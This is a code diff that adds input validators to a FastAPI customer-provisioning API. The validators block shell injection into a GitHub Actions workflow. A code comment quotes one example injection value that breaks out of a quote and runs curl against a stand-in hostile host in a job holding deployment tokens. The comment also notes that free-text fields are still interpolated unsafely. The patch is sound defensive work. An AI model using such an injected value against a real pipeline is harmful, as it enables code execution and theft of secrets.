@@ -2,10 +2,11 @@
 
 from __future__ import annotations
 
+import re
 from uuid import uuid4
 
 from fastapi import APIRouter, Depends, Header, HTTPException
-from pydantic import BaseModel, Field
+from pydantic import BaseModel, Field, field_validator
 
 from app.auth.principal import Principal, resolve_principal
 from app.config import get_settings
@@ -29,6 +30,25 @@ from app.provisioning.service import CustomerProvisioner, ProvisioningResult, no
 from app.schemas import BrandThemeOut
 
 router = APIRouter(prefix="/api/provisioning", tags=["provisioning"])
+
+# Structural provisioning inputs (versions, slugs, module ids, hex colors) are
+# interpolated into the provision-customer GitHub Actions workflow's shell/python
+# steps. Constrain them to a shell/python-inert charset at the trust boundary so a
+# value like "1.0'; curl evil #" can never break out of a quote and run code in a
+# job that holds RAILWAY_TOKEN and the callback key. Free-text fields (customer/
+# brand names, logo URLs) legitimately contain quotes/spaces and are NOT charset-
+# constrained here — those must instead be passed to the workflow via env vars,
+# never via ${{ }} interpolation (tracked follow-up).
+_WORKFLOW_SAFE = re.compile(r"^[A-Za-z0-9._:/+#-]*$")
+
+
+def _reject_unsafe(value: str, field: str) -> str:
+    if value and not _WORKFLOW_SAFE.match(value):
+        raise ValueError(
+            f"{field} may only contain letters, digits, and . _ : / + # - "
+            "(no quotes, whitespace, or shell metacharacters)."
+        )
+    return value
 
 
 class BundleOut(BaseModel):
@@ -54,6 +74,15 @@ class BrandThemeInput(BaseModel):
     danger_color: str = Field(default=DEFAULT_BRAND_THEME["danger_color"], max_length=7)
     logo_url: str = Field(default="", max_length=500)
 
+    @field_validator(
+        "primary_color", "secondary_color", "accent_color", "background_color",
+        "surface_color", "text_color", "muted_color", "success_color",
+        "warning_color", "danger_color",
+    )
+    @classmethod
+    def _colors_are_inert(cls, v: str) -> str:
+        return _reject_unsafe(v, "color")
+
 
 class CustomerProvisionCreate(BaseModel):
     customer_name: str = Field(min_length=1, max_length=200)
@@ -73,6 +102,22 @@ class CustomerProvisionCreate(BaseModel):
     external_provisioning: bool = False
     dry_run: bool = True
     callback_url: str = Field(default="", max_length=500)
+
+    @field_validator(
+        "bundle_id", "deployment_type", "region", "release_ring",
+        "initial_version", "current_migration",
+    )
+    @classmethod
+    def _structural_fields_are_inert(cls, v: str) -> str:
+        return _reject_unsafe(v, "field")
+
+    @field_validator("module_versions")
+    @classmethod
+    def _module_versions_are_inert(cls, v: dict[str, str]) -> dict[str, str]:
+        for key, val in v.items():
+            _reject_unsafe(key, "module id")
+            _reject_unsafe(val, "module version")
+        return v
 
 
 class ProvisioningCallbackIn(BaseModel):
